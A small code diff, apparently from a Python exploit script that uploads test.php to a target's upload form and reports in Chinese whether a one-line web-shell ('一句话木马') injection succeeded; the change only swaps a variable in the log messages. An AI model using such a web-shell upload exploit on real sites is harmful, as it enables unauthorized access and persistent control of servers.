@@ -46,9 +46,9 @@ Content-Disposition: form-data; name="userfile"; filename="test.php"
         if r.status_code == 200 and "test.php" in r.text:
             print(f"{url}[*]一句话木马注入成功")
         else:
-            print(f"{target}[-]一句话木马注入失败")
+            print(f"{url}[-]一句话木马注入失败")
     except Exception as e:
-        print(f"{target}[-]访问超时")
+        print(f"{url}[-]访问超时")
 
 
 
